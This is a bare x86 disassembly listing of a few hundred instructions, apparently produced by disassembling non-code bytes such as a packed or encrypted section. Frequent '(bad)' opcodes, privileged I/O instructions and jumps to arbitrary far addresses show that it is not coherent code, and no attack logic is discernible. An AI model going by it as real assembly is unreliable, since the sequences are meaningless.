  41c0c3:	xchg   edi,eax
  41c0c4:	jmp    0x41c136
  41c0c6:	outs   dx,BYTE PTR ds:[esi]
  41c0c7:	xor    BYTE PTR [ebx],ch
  41c0c9:	mov    eax,0xbe85b75b
  41c0ce:	int3   
  41c0cf:	clc    
  41c0d0:	sub    BYTE PTR [ebx],ah
  41c0d2:	rcr    eax,cl
  41c0d4:	jge    0x41c0a9
  41c0d6:	cmp    ch,BYTE PTR [eax-0x2c]
  41c0d9:	sbb    DWORD PTR [ebp+0x8],ebp
  41c0dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0dd:	mov    al,ds:0x6ba3cca2
  41c0e2:	push   ecx
  41c0e3:	mov    eax,ds:0xe351019b
  41c0e8:	test   eax,0xbfe67219
  41c0ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0ee:	jle    0x41c0c1
  41c0f0:	push   edx
  41c0f1:	cmp    eax,0xbf249ec7
  41c0f6:	test   al,0x3f
  41c0f8:	rcl    al,0x1d
  41c0fb:	and    al,0xcf
  41c0fd:	lock and cl,0x2d
  41c101:	and    al,0xb1
  41c103:	test   al,0x19
  41c106:	les    ecx,FWORD PTR [ebx-0x5eb04e8a]
  41c10c:	dec    edx
  41c10d:	cmp    esp,DWORD PTR [edi-0x15]
  41c110:	mov    al,BYTE PTR [ebx+0x68]
  41c113:	mov    ebp,0x1f52f232
  41c118:	scas   eax,DWORD PTR es:[edi]
  41c119:	or     BYTE PTR [ecx-0x1a],bl
  41c11c:	inc    ecx
  41c11d:	pop    ebx
  41c11e:	jno    0x41c0fc
  41c120:	mov    esi,0x45526336
  41c125:	mov    edx,0xafaa3541
  41c12a:	push   ebx
  41c12b:	sub    bh,ch
  41c12d:	jg     0x41c0af
  41c12f:	and    ch,cl
  41c131:	push   0xffffffaf
  41c133:	or     ebp,DWORD PTR [edx]
  41c135:	not    DWORD PTR [edx-0x6183515b]
  41c13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c13c:	loop   0x41c0f3
  41c13e:	(bad)  
  41c13f:	pop    ss
  41c140:	inc    eax
  41c141:	stos   DWORD PTR es:[edi],eax
  41c142:	loop   0x41c11b
  41c144:	pushf  
  41c145:	xchg   eax,esi
  41c147:	hlt    
  41c148:	push   0x36
  41c14a:	clc    
  41c14b:	retf   
  41c14c:	inc    esi
  41c14d:	mov    cl,BYTE PTR [ebp-0x8]
  41c150:	cli    
  41c151:	rcl    dl,1
  41c153:	stc    
  41c154:	jnp    0x41c1d1
  41c156:	dec    eax
  41c157:	push   esi
  41c158:	mov    ?,WORD PTR [ebx+eax*1+0x3b70b1b6]
  41c15f:	jmp    0x66bf:0xfdb7b50a
  41c166:	dec    esi
  41c167:	lods   al,BYTE PTR ds:[esi]
  41c168:	jp     0x41c1d0
  41c16a:	inc    ebp
  41c16b:	stc    
  41c16c:	call   0x4103:0xa5a565be
  41c173:	pop    edi
  41c174:	pusha  
  41c175:	test   eax,0x245b4956
  41c17a:	in     al,dx
  41c17b:	pop    ds
  41c17c:	loop   0x41c17a
  41c17e:	ds pop ss
  41c180:	xor    esp,DWORD PTR [esi+0x77d73201]
  41c186:	push   ebp
  41c187:	cmp    eax,0x9b72c999
  41c18c:	cmp    BYTE PTR [esi],0x73
  41c18f:	jg     0x41c1db
  41c191:	rcl    ecx,0x56
  41c194:	or     DWORD PTR [eax+0x235b8eff],edi
  41c19a:	adc    bh,BYTE PTR ds:0x3aaa9ea6
  41c1a0:	fwait
  41c1a1:	push   0x34
  41c1a3:	ds dec ebx
  41c1a5:	and    bl,BYTE PTR [edx+0x10ced706]
  41c1ab:	pop    ebx
  41c1ac:	sbb    ebp,ecx
  41c1ae:	test   DWORD PTR [ebx+0x3a],ebp
  41c1b1:	push   edx
  41c1b2:	pop    esp
  41c1b3:	rol    DWORD PTR [esi],0xc3
  41c1b6:	mov    cl,0x6
  41c1b8:	xor    al,0x82
  41c1ba:	cs jg  0x41c21d
  41c1bd:	mov    ah,0x85
  41c1bf:	ja     0x41c147
  41c1c1:	xlat   BYTE PTR ds:[ebx]
  41c1c2:	jmp    0x41c1ac
  41c1c4:	js     0x41c1e6
  41c1c6:	ror    ecx,1
  41c1c8:	xchg   ebp,eax
  41c1c9:	jnp    0x41c19e
  41c1cb:	adc    eax,0x6dc620c0
  41c1d0:	inc    eax
  41c1d1:	push   0xebb71a04
  41c1d6:	fadd   DWORD PTR [esi+0x2b]
  41c1d9:	cmp    BYTE PTR [esi],0xb2
  41c1dc:	xor    DWORD PTR [eax-0x6d],ebx
  41c1df:	test   edi,ebx
  41c1e1:	dec    edi
  41c1e2:	mov    ebx,DWORD PTR [ebx+0x4e944d93]
  41c1e8:	lds    ebp,FWORD PTR ds:0xed004654
  41c1ee:	pop    ds
  41c1ef:	dec    esi
  41c1f0:	call   0xed542470
  41c1f5:	(bad)  
  41c1f6:	loopne 0x41c241
  41c1f8:	jmp    0x41c23e
  41c1fa:	(bad)  
  41c1fb:	out    0xbe,al
  41c1fd:	cmp    esi,DWORD PTR [eax-0x70]
  41c200:	xchg   esp,eax
  41c201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c202:	imul   DWORD PTR [edi+eiz*2+0x2eddb6cb]
  41c209:	inc    ebp
  41c20a:	cli    
  41c20b:	lea    ebp,ss:[ebp+edi*2-0x7c4f83ae]
  41c213:	in     al,0xc0
  41c215:	data16 add dh,bl
  41c218:	or     al,0x52
  41c21a:	push   ecx
  41c21b:	pop    ebp
  41c21c:	ret    0xa5b2
  41c21f:	inc    edi
  41c220:	cmp    eax,0xcef48728
  41c225:	and    al,0x3b
  41c227:	jecxz  0x41c1f2
  41c229:	retf   
  41c22a:	(bad)  
  41c22b:	xchg   ebp,eax
  41c22c:	lock mov ebp,0x41b9acfa
  41c232:	mov    edi,0x70f959e4
  41c237:	arpl   sp,di
  41c239:	inc    edi
  41c23a:	(bad)  
  41c23c:	dec    ecx
  41c23d:	cmp    BYTE PTR [edx],bl
  41c23f:	imul   esp,DWORD PTR [edi+edx*4+0x11],0xadfd71df
  41c247:	cmp    DWORD PTR ds:0x1f3bd591,ecx
  41c24d:	mov    fs,WORD PTR [eax+edx*8+0x1b]
  41c251:	adc    bh,BYTE PTR [edx]
  41c253:	sub    eax,0x9516838d
  41c258:	nop
  41c259:	fld    DWORD PTR [ebx]
  41c25b:	frstor [ebp+edi*4-0x24994b40]
  41c262:	arpl   WORD PTR [ecx],bx
  41c264:	jp     0x41c286
  41c266:	outs   dx,DWORD PTR ds:[esi]
  41c267:	or     dh,BYTE PTR [edi]
  41c269:	outs   dx,BYTE PTR ds:[esi]
  41c26a:	mov    bh,0xfa
  41c26c:	inc    ebp
  41c26d:	push   ss
  41c26e:	dec    eax
  41c26f:	int    0xbe
  41c271:	stc    
  41c272:	sti    
  41c273:	retf   
  41c274:	icebp  
  41c275:	jge    0x41c27f
  41c277:	(bad)  
  41c278:	bound  edi,QWORD PTR [edx-0x470bf846]
  41c27e:	fiadd  DWORD PTR [ebp+0x6952cbaa]
  41c284:	(bad)  
  41c285:	in     eax,dx
  41c286:	repz daa 
  41c288:	add    al,0xf7
  41c28a:	(bad)  
  41c28b:	fmul   QWORD PTR [esi+esi*2+0x52a49800]
  41c292:	push   edi
  41c293:	into   
  41c294:	arpl   WORD PTR [edx-0x6d],bx
  41c297:	pop    esp
  41c298:	sahf   
  41c299:	inc    eax
  41c29a:	imul   edx,ebx,0xffffffc6
  41c29d:	and    BYTE PTR [ecx+0x54c0bf],al
  41c2a3:	xor    BYTE PTR [edx+0x41ff7743],ah
  41c2a9:	sbb    DWORD PTR [ebx-0x71],edi
  41c2ac:	lods   eax,DWORD PTR ds:[esi]
  41c2ad:	dec    esp
  41c2ae:	xchg   esp,ebp
  41c2b0:	sbb    BYTE PTR [edi],0xaf
  41c2b3:	pop    eax
  41c2b4:	ret    0x477b
  41c2b7:	repnz pop esp
  41c2b9:	mov    BYTE PTR [esi+0x2a3c44ec],dh
  41c2bf:	or     BYTE PTR [ebx+0x4],bl
  41c2c2:	leave  
  41c2c3:	in     eax,0xb1
  41c2c5:	jle    0x41c279
  41c2c7:	or     eax,0xd5ff7e69
  41c2cc:	xchg   ecx,eax
  41c2cd:	fisttp WORD PTR [ebx]
  41c2cf:	lods   eax,DWORD PTR ds:[esi]
  41c2d0:	shr    DWORD PTR [edx+0x63],cl
  41c2d3:	sbb    DWORD PTR [edx+0x63],esi
  41c2d6:	and    BYTE PTR [edi-0x715aaa55],cl
  41c2dc:	dec    edi
  41c2dd:	add    DWORD PTR [ebp-0x3b],ecx
  41c2e0:	mov    edx,0x752a43fb
  41c2e5:	out    0x47,al
  41c2e7:	xor    al,0x87
  41c2e9:	mov    dl,0x82
  41c2eb:	push   ds
  41c2ec:	ja     0x41c35b
  41c2ee:	add    BYTE PTR [esi+0x59],al
  41c2f1:	out    dx,al
  41c2f2:	loop   0x41c364
  41c2f4:	mov    ds:0x956d8997,al
  41c2f9:	and    DWORD PTR [ecx+edx*8+0x4b9ddb3d],ebx
  41c300:	mov    ds:0x717297d2,al
  41c305:	icebp  
  41c306:	push   edx
  41c307:	fcom   st(4)
  41c309:	not    edi
  41c30b:	in     eax,0xee
  41c30d:	push   edi
  41c30e:	jnp    0x41c333
  41c310:	cmp    al,0x6f
  41c312:	adc    DWORD PTR [ebx-0x6807df71],0x1e
  41c319:	test   al,0xcd
  41c31b:	fsub   QWORD PTR [esi+0x31]
  41c31e:	icebp  
  41c31f:	(bad)  
  41c320:	je     0x41c330
  41c322:	lods   al,BYTE PTR ds:[esi]
  41c323:	sub    al,0x17
  41c325:	inc    eax
  41c326:	dec    esi
  41c327:	cs int 0xca
  41c32a:	pop    esi
  41c32b:	pop    eax
  41c32c:	add    dl,bl
  41c32e:	push   edi
  41c330:	aas    
  41c331:	bound  ebx,QWORD PTR [eax-0x3b]
  41c334:	mov    bh,0xde
  41c336:	repnz pushf 
  41c338:	fcom   DWORD PTR [ebp-0x45]
  41c33b:	hlt    
  41c33c:	or     eax,0x3f1ea9b9
  41c341:	pop    ebx
  41c342:	push   esp
  41c343:	mov    cl,0x2e
  41c345:	mov    cl,BYTE PTR [edi-0x24]
  41c348:	cmp    DWORD PTR [ebp+0x4e],0x6cf2f92a
  41c34f:	pop    edx
  41c350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c351:	inc    eax
  41c352:	rcr    bh,1
  41c354:	lock jp 0x41c31b
  41c357:	jmp    0xaa667a15
  41c35c:	jae    0x41c3b3
  41c35e:	sub    eax,0x831e727
  41c363:	loope  0x41c3d0
  41c365:	idiv   edi
  41c367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c368:	rcr    BYTE PTR ds:[edi+0x6b1b99df],0xe6
  41c370:	push   ss
  41c371:	and    DWORD PTR [ecx],edi
  41c373:	stos   DWORD PTR es:[edi],eax
  41c374:	(bad)  
  41c375:	mov    ds:0x4cb7beff,eax
  41c37a:	dec    edi
  41c37b:	sbb    DWORD PTR [ecx-0x26121c2a],0x18
  41c382:	and    al,0x28
  41c385:	or     BYTE PTR [esp+ebp*4-0x61],dh
  41c389:	xchg   edi,eax
  41c38a:	push   edx
  41c38b:	xor    eax,DWORD PTR [ebx+ebx*4]
  41c38e:	adc    ah,BYTE PTR [eax+ecx*8-0x67dd562]
  41c395:	les    edi,FWORD PTR [ecx]
  41c397:	or     al,al
  41c399:	mov    ah,0x54
  41c39b:	push   DWORD PTR [esi+eax*2]
  41c39e:	push   esi
  41c39f:	lods   al,BYTE PTR ds:[esi]
  41c3a0:	das    
  41c3a1:	inc    eax
  41c3a2:	rcr    DWORD PTR [eax],0x1c
  41c3a5:	stos   BYTE PTR es:[edi],al
  41c3a6:	out    0x4f,eax
  41c3a8:	sub    ebp,esi
  41c3aa:	add    esi,eax
  41c3ac:	(bad)  
  41c3ad:	stc    
  41c3ae:	inc    esi
  41c3af:	mov    ah,BYTE PTR [ebx+esi*8-0x3b]
  41c3b3:	jmp    0xbfefb49
  41c3b8:	cwde   
  41c3b9:	mov    eax,0xc6c81085
  41c3be:	(bad)  
  41c3bf:	push   0xe339345b
  41c3c4:	add    edi,esi
  41c3c6:	push   ds
  41c3c7:	xor    ebp,DWORD PTR ds:0x7c106ed9
  41c3cd:	(bad)  
  41c3ce:	mov    esi,0xe709e651
  41c3d3:	(bad)  
  41c3d4:	(bad)  
  41c3d5:	lock or eax,0xe0da0a02
  41c3db:	xchg   edi,eax
  41c3dc:	loopne 0x41c451
  41c3de:	adc    dl,BYTE PTR [ebp+0x50]
  41c3e1:	push   0xffffffbc
  41c3e3:	adc    bh,bh
  41c3e5:	cdq    
  41c3e6:	js     0x41c441
  41c3e8:	and    eax,0x5784a525
  41c3ed:	add    eax,DWORD PTR [ebx+0x412023ca]
  41c3f3:	xchg   ecx,eax
  41c3f4:	cdq    
  41c3f5:	push   esi
  41c3f6:	sar    BYTE PTR [edi],cl
  41c3f8:	jns    0x41c411
  41c3fa:	xor    ebx,esi
  41c3fc:	rcl    BYTE PTR [eax+0x4d],cl
  41c3ff:	cmp    bh,BYTE PTR [eax]
  41c401:	cwde   
  41c402:	mov    ebp,0xf582f454
  41c407:	pop    edi
  41c408:	cdq    
  41c409:	(bad)  
  41c40a:	in     al,dx
  41c40b:	mov    ah,0xa7
  41c40d:	pop    edx
  41c40e:	(bad)  
  41c40f:	out    dx,al
  41c410:	neg    DWORD PTR [eax-0x3]
  41c413:	lea    edi,[esi]
  41c415:	lea    ebp,[esi]
  41c417:	loop   0x41c3ee
  41c419:	lahf   
  41c41a:	lock rcl DWORD PTR [ebp+esi*8+0x6d],0x8c
  41c420:	test   al,0x88
  41c422:	daa    
  41c423:	int3   
  41c424:	js     0x41c3e2
  41c426:	stos   DWORD PTR es:[edi],eax
  41c427:	ficom  WORD PTR [edx+ecx*2]
  41c42a:	imul   ebp,DWORD PTR [esi+0x42],0x22
  41c42e:	push   esi
  41c42f:	dec    edx
  41c430:	ja     0x41c3cf
  41c432:	xlat   BYTE PTR ds:[ebx]
  41c433:	push   ebx
  41c434:	xor    DWORD PTR [ebx+0x36],0x1b2c0c50
  41c43b:	pushf  
  41c43c:	ret    0xda6e
  41c43f:	jg     0x41c3ca
  41c441:	pop    ebx
  41c442:	dec    edx
  41c443:	mov    al,ds:0x75c2d0da
  41c448:	pushf  
  41c449:	xchg   ebx,eax
  41c44a:	rcr    cl,cl
  41c44c:	push   es
  41c44d:	(bad)  
  41c44e:	cdq    
  41c44f:	dec    ebp
  41c450:	adc    DWORD PTR fs:[edi],esi
  41c453:	add    al,0xd7
  41c455:	mov    esp,0x3e105fb1
  41c45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c45b:	sub    DWORD PTR [ebx],0xfffffffd
  41c45e:	hlt    
  41c45f:	sbb    ch,BYTE PTR [edi]
  41c461:	mov    dl,0x6a
  41c463:	fsubr  QWORD PTR [ecx+0x5a5d6ec1]
  41c469:	repnz mov ebp,0x5c90881c
  41c46f:	sbb    DWORD PTR [ebp+0x78668127],0x4812f8e1
  41c479:	retf   0x30da
  41c47c:	loop   0x41c437
  41c47e:	mov    dh,0x24
  41c480:	test   eax,0x4c2eff32
  41c485:	je     0x41c428
  41c487:	jo     0x41c426
  41c489:	jae    0x41c508
  41c48b:	cmp    eax,0x2bf25dfc
  41c490:	cmp    DWORD PTR [ebp+0x1a1fc48f],ebp
  41c496:	mov    edi,0xef1cd84f
  41c49b:	call   0xfa55e96b
  41c4a0:	int    0x9b
  41c4a2:	das    
  41c4a3:	div    BYTE PTR [eax]
  41c4a5:	lods   al,BYTE PTR ds:[esi]
  41c4a6:	ret    
  41c4a7:	pop    edx
  41c4a8:	mov    ebp,0xf93c83
  41c4ad:	jo     0x41c479
  41c4af:	inc    ebp
  41c4b0:	data16 in al,0xd2
  41c4b3:	or     eax,0x9263d05c
  41c4b8:	mov    ch,0xf3
  41c4ba:	xchg   edx,eax
  41c4bb:	add    DWORD PTR [ecx],ecx
  41c4bd:	pop    edi
  41c4be:	(bad)  
  41c4bf:	pop    eax
  41c4c0:	dec    eax
  41c4c1:	and    DWORD PTR [esi+0x20d02ba3],ebp
  41c4c7:	lds    ecx,FWORD PTR [esi+0x23d02c72]
  41c4cd:	out    dx,al
  41c4ce:	outs   dx,DWORD PTR ds:[esi]
  41c4cf:	sub    eax,0x69cebeb8
  41c4d4:	sbb    BYTE PTR [esi+0x5f],ch
  41c4d7:	sbb    ebp,ebx
  41c4d9:	int3   
  41c4da:	xchg   edi,eax
  41c4db:	outs   dx,DWORD PTR ds:[esi]
  41c4dc:	cmp    BYTE PTR [esp+eiz*2+0xd],0x19
  41c4e1:	xchg   eax,ebx
  41c4e3:	cmp    DWORD PTR [ebp-0x66],esp
  41c4e6:	xor    dh,BYTE PTR [eax]
  41c4e8:	iret   
  41c4e9:	adc    bl,BYTE PTR ss:[esp+ecx*4]
  41c4ed:	fmul   st(0),st
  41c4ef:	push   eax
  41c4f0:	jb     0x41c55e
  41c4f2:	cdq    
  41c4f3:	mov    ch,0x13
  41c4f5:	gs js  0x41c4b9
  41c4f8:	and    al,ch
  41c4fa:	jno    0x41c4c5
  41c4fc:	cld    
  41c4fd:	jb     0x41c4dc
  41c4ff:	mov    edi,0x950a16f
  41c504:	cs aad 0x20
  41c507:	cmp    BYTE PTR [ebp-0x61847c98],bh
  41c50d:	push   ebp
  41c50e:	xor    al,0xc2
  41c510:	add    bl,BYTE PTR [ebp+0x129a1381]
  41c516:	pop    es
  41c517:	jns    0x41c58c
  41c519:	imul   edi,DWORD PTR [eax],0x69
  41c51c:	jo     0x41c504
  41c51e:	popf   
  41c51f:	cmp    DWORD PTR [eax+eiz*2-0x6414d465],edi
  41c526:	xchg   esp,eax
  41c527:	mov    esi,0x2bde6c89
  41c52c:	push   edx
  41c52d:	sbb    ebp,DWORD PTR [edi+0x30]
  41c530:	daa    
  41c531:	lock cwde 
  41c533:	xor    BYTE PTR [ebp+esi*4+0x20],dh
  41c537:	inc    edi
  41c538:	xchg   ecx,eax
  41c539:	mov    edi,0xa394ad55
  41c53e:	xlat   BYTE PTR ds:[ebx]
  41c53f:	adc    BYTE PTR [ebp-0x5960b060],cl
  41c545:	mov    BYTE PTR [ebx-0x56],bh
  41c548:	pop    edx
  41c549:	test   eax,0x7879f7ba
  41c54e:	ss sti 
  41c550:	cld    
  41c551:	mov    eax,ds:0x3887ebef
  41c556:	imul   ecx,esp,0x4a
  41c559:	jmp    0xb2e3:0x8da49ad
  41c560:	add    BYTE PTR [ebp+0x123de585],ah
  41c566:	and    al,0x35
  41c568:	sbb    cl,BYTE PTR [esp+ebp*4+0x192290c3]
  41c56f:	mov    esi,0xaa9c3a03
  41c574:	bound  ecx,QWORD PTR [ecx-0x24]
  41c577:	xor    eax,0xe180c049
  41c57c:	scas   al,BYTE PTR es:[edi]
  41c57d:	mov    ebp,0x2f71ac82
  41c582:	mov    edx,0x6d04b3f0
  41c587:	(bad)  
  41c588:	jmp    0x619a:0xc05dd051
  41c58f:	xor    DWORD PTR [ebx],ebx
  41c591:	adc    edx,DWORD PTR ds:0x86812eee
  41c597:	sub    bl,BYTE PTR [bx+si]
  41c59a:	test   ebp,ebp
  41c59c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c59d:	mov    esp,DWORD PTR [esi+edi*4+0x19ef7a4f]
  41c5a4:	popa   
  41c5a5:	jg     0x41c5aa
  41c5a7:	dec    eax
  41c5a8:	(bad)  
  41c5a9:	and    al,0x3
  41c5ab:	retf   0xb187
  41c5ae:	push   eax
  41c5af:	test   BYTE PTR [edx],ch
  41c5b1:	cmp    eax,0x3009de90
  41c5b6:	test   eax,0xac225c53
  41c5bb:	mov    bh,0xa3
  41c5bd:	ins    DWORD PTR es:[edi],dx
  41c5be:	dec    esp
  41c5bf:	sbb    bl,BYTE PTR [eax-0x4c]
  41c5c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5c3:	mov    ah,0x39
  41c5c5:	fmul   DWORD PTR [esi-0x72]
  41c5c8:	sahf   
  41c5c9:	(bad)  
  41c5ca:	cmp    eax,0x7501c54d
  41c5cf:	lods   al,BYTE PTR ds:[esi]
  41c5d0:	mov    ebp,0xc78b3cc7
  41c5d5:	jae    0x41c5a4
  41c5d7:	dec    edi
  41c5d8:	repz dec edi
  41c5da:	jmp    0xc655:0xea3acaba
  41c5e1:	stos   BYTE PTR es:[edi],al
  41c5e2:	mov    ebx,0xf071fe58
  41c5e7:	xlat   BYTE PTR ds:[ebx]
  41c5e8:	hlt    
  41c5e9:	mov    DWORD PTR [ecx+0x7],ebx
  41c5ec:	mov    al,BYTE PTR [eax-0x66]
  41c5ef:	cwde   
  41c5f0:	in     eax,0x57
  41c5f2:	sub    DWORD PTR [ebp+0x33],edi
  41c5f5:	cmp    ah,cl
  41c5f7:	inc    esi
  41c5f8:	rcl    DWORD PTR [edi+eax*8],0x7d
  41c5fc:	jne    0x41c5bf
  41c5fe:	xchg   DWORD PTR [ecx],edi
  41c600:	hlt    
  41c601:	cdq    
  41c602:	(bad)  
  41c604:	imul   ebp,edx,0x64d29971
  41c60a:	sub    ebp,DWORD PTR [edx-0x4e20d7a5]
  41c610:	lods   eax,DWORD PTR ds:[esi]
  41c611:	adc    al,0x59
  41c613:	aas    
  41c614:	pop    edi
  41c615:	shr    DWORD PTR [edi],1
  41c617:	iret   
  41c618:	cmp    edi,0x2b
  41c61b:	fcomp  QWORD PTR [ebp+0x2fbefe61]
  41c621:	adc    ecx,DWORD PTR [ebp+0x56]
  41c624:	adc    al,0xfc
  41c626:	loopne 0x41c5c7
  41c628:	ret    0xdd82
  41c62b:	dec    esp
  41c62c:	push   cs
  41c62d:	int    0xc8
  41c62f:	sub    esi,DWORD PTR [ebx]
  41c631:	int    0x89
  41c633:	popa   
  41c634:	nop
  41c635:	ror    BYTE PTR [ebp-0x2c],cl
  41c638:	bound  edx,QWORD PTR [ecx+edi*2]
  41c63b:	adc    ebx,edi
  41c63d:	in     al,dx
  41c63e:	std    
  41c63f:	dec    eax
  41c640:	lock mov ds:0x8e56c87b,eax
  41c646:	loop   0x41c5d8
  41c648:	xor    esi,ebp
  41c64a:	stos   BYTE PTR es:[edi],al
  41c64b:	sbb    ah,cl
  41c64d:	push   ss
  41c64e:	lahf   
  41c64f:	push   ss
  41c650:	xchg   esp,eax
  41c651:	sti    
  41c652:	or     eax,0xd2c3ac3b
  41c657:	mov    ch,0xa9
  41c659:	dec    eax
  41c65a:	mov    ah,0x1d
  41c65c:	es push esp
  41c65e:	pop    ecx
  41c65f:	or     dl,BYTE PTR [edi-0x1]
  41c662:	sar    DWORD PTR [edx+0x7b],cl
  41c665:	clc    
  41c666:	shl    BYTE PTR [esi+0x4fbc7f31],1
  41c66c:	les    eax,FWORD PTR [edi*1-0x35cc1f8b]
  41c673:	in     al,dx
  41c674:	je     0x41c691
  41c676:	(bad)  
  41c677:	popa   
  41c678:	add    DWORD PTR [eax+0x37],ecx
  41c67b:	mov    ch,al
  41c67d:	jb     0x41c67b
  41c67f:	push   esi
  41c680:	inc    esi
  41c681:	mov    al,ds:0xe6bdb170
  41c686:	pop    esp
  41c687:	mov    ah,0x48
  41c689:	test   DWORD PTR [ebx+edi*2],ecx
  41c68c:	push   es
  41c68d:	jg     0x41c6a3
  41c68f:	pop    edi
  41c690:	out    dx,al
  41c691:	loopne 0x41c66b
  41c693:	int3   
  41c694:	imul   esi,ebx,0x11
  41c697:	lahf   
  41c698:	xor    esi,DWORD PTR [ecx-0xda5cd4f]
  41c69e:	ficom  DWORD PTR [ebp-0x48]
  41c6a1:	ja     0x41c64b
  41c6a3:	pop    edi
  41c6a4:	pop    esi
  41c6a5:	push   ss
  41c6a6:	jp     0x41c713
  41c6a8:	sub    eax,0x3ff37a79
  41c6ad:	(bad)  
  41c6ae:	mov    dl,0x17
  41c6b0:	fwait
  41c6b1:	push   0xffffffc3
  41c6b3:	xchg   dl,bh
  41c6b5:	ds dec esp
  41c6b7:	sub    dh,bh
  41c6b9:	sbb    ebx,DWORD PTR [ecx+0x3e4d09d]
  41c6bf:	call   0xc579:0x9b991896
  41c6c6:	lea    ecx,[esi]
  41c6c8:	mov    BYTE PTR [eax+eax*8+0x5fbabe81],0x9
  41c6d0:	dec    ecx
  41c6d1:	repz ret 
  41c6d3:	xchg   esi,eax
  41c6d4:	clc    
  41c6d5:	(bad)  
  41c6d6:	std    
  41c6d7:	sbb    esp,DWORD PTR [edx-0x57177e9c]
  41c6dd:	mov    edi,0x5dbd9473
  41c6e2:	sahf   
  41c6e3:	js     0x41c743
  41c6e5:	pop    ebx
  41c6e6:	jne    0x41c6f1
  41c6e8:	scas   eax,DWORD PTR es:[edi]
  41c6e9:	pushf  
  41c6ea:	mov    bh,0x71
  41c6ec:	or     DWORD PTR [eax+0x3c5b9326],edx
  41c6f2:	aas    
  41c6f3:	sahf   
  41c6f4:	cmp    DWORD PTR [ebx],ecx
  41c6f6:	mov    DWORD PTR [ecx+0xfb4c7e9],edi
  41c6fc:	test   al,0x3c
  41c6fe:	push   ds
  41c6ff:	jecxz  0x41c71e
  41c701:	mov    eax,gs
  41c703:	pop    ebp
  41c704:	fidivr DWORD PTR [ebx-0x4e]
  41c707:	ret    0xb062
  41c70a:	popf   
  41c70b:	mov    ebp,0xee4351bf
  41c710:	shl    DWORD PTR [esp+edi*4+0x7e],cl
  41c714:	ret    
  41c715:	jo     0x41c6ad
  41c717:	sbb    esp,DWORD PTR [eax+0x4e]
  41c71a:	adc    DWORD PTR [ecx+edx*8-0x13a0dc],0x6b
  41c722:	out    dx,al
  41c723:	adc    DWORD PTR [ecx+0x12],0x5c
  41c727:	cmp    ch,ch
  41c729:	lods   al,BYTE PTR ds:[esi]
  41c72a:	cli    
  41c72b:	fild   WORD PTR [edi+0x4e]
  41c72e:	iret   
  41c72f:	shr    DWORD PTR [esi],0x2d
  41c732:	push   ebp
  41c733:	add    ah,dh
  41c735:	inc    ebx
  41c736:	je     0x41c70d
  41c738:	sbb    eax,0xdc192fc7
  41c73d:	bound  ecx,QWORD PTR [eax+0x7]
  41c740:	add    bh,BYTE PTR [edi]
  41c742:	pop    ds
  41c743:	push   0xdeefa259
  41c748:	scas   eax,DWORD PTR es:[edi]
  41c749:	xor    bh,BYTE PTR [ecx+eax*2+0x40]
  41c74d:	or     dl,dl
  41c74f:	pop    edx
  41c750:	sbb    DWORD PTR [esi],0xffffff8e
  41c753:	jo     0x41c76c
  41c755:	gs loope 0x41c7d0
  41c758:	push   ds
  41c759:	leave  
  41c75a:	mov    ah,0x75
  41c75c:	jnp    0x41c754
  41c75e:	push   esi
  41c75f:	fisub  DWORD PTR [eax-0x3d]
  41c762:	stos   DWORD PTR es:[edi],eax
  41c763:	pop    esi
  41c764:	pop    ds
  41c765:	sub    eax,0x40bfc66e
  41c76a:	loopne 0x41c7bc
  41c76c:	sub    bh,BYTE PTR [esi+esi*8]
  41c76f:	dec    esi
  41c770:	scas   eax,DWORD PTR es:[edi]
  41c771:	stc    
  41c772:	test   BYTE PTR ds:0x8c521ace,bh
  41c778:	das    
  41c779:	mov    al,ds:0x8282feba
  41c77e:	jle    0x41c72b
  41c780:	add    dl,BYTE PTR [edx+0x3a]
  41c783:	xchg   edi,eax
  41c784:	sbb    eax,ebp
  41c786:	sbb    BYTE PTR ds:0x2d7ae5e3,dh
  41c78c:	pop    es
  41c78d:	sbb    BYTE PTR [edi],bl
  41c78f:	cmp    al,0xef
  41c791:	fsub   DWORD PTR [ebx+0x11ae576d]
  41c797:	sub    DWORD PTR [edi],0xa84d832f
  41c79d:	retf   0xb45b
  41c7a0:	and    ch,ah
  41c7a2:	or     cl,BYTE PTR [eax-0x48475f89]
  41c7a8:	push   0x62
  41c7aa:	sub    eax,0x8c916ee8
  41c7af:	test   al,0xdc
  41c7b1:	xchg   esp,eax
  41c7b2:	mov    edi,0xcdeb888a
  41c7b7:	(bad)
  41c7bb:	pop    edi
  41c7bc:	pop    ebp
  41c7bd:	fwait
  41c7be:	lods   eax,DWORD PTR ds:[esi]
  41c7bf:	cmp    dl,0x2f
  41c7c2:	adc    BYTE PTR [eax+0x2],bh
  41c7c5:	outs   dx,BYTE PTR ds:[esi]
  41c7c6:	xor    DWORD PTR [ebp-0x52da0469],ecx
  41c7cc:	test   BYTE PTR [ebp+edx*8+0x76],bl
  41c7d0:	pmulhuw mm5,QWORD PTR [eax-0x33]
  41c7d4:	popa   
  41c7d5:	repnz mov dh,0xc6
  41c7d8:	mov    esi,eax
  41c7da:	fisttp WORD PTR [ebx]
  41c7dc:	fnstsw WORD PTR [esp+eax*2]
  41c7df:	outs   dx,BYTE PTR ds:[esi]
  41c7e0:	arpl   WORD PTR [ebp-0x537a02d5],si
  41c7e6:	jg     0x41c7a0
  41c7e8:	ficomp DWORD PTR [esi+0x62fac28b]
  41c7ee:	jno    0x41c857
  41c7f0:	mov    esi,0xecc6fda7
  41c7f5:	out    dx,al
  41c7f6:	push   es
  41c7f7:	gs retf 0xa0cf
  41c7fb:	call   0xfd49:0xcb947960
  41c802:	inc    ebx
  41c803:	lods   al,BYTE PTR ds:[esi]
  41c804:	xor    al,0x2a
  41c806:	push   es
  41c807:	mov    eax,0x762ae6fd
  41c80c:	xchg   ecx,eax
  41c80d:	sbb    al,BYTE PTR [edi+0x8798935]
  41c813:	call   0x1cb4beb3
  41c818:	addr16 jmp 0x41c823
  41c81b:	jne    0x41c883
  41c81d:	icebp  
  41c81e:	sbb    dh,BYTE PTR [edx-0x2369fe6d]
  41c824:	sub    eax,0x1703f3d2
  41c829:	add    esp,DWORD PTR [esp+ecx*2+0x26]
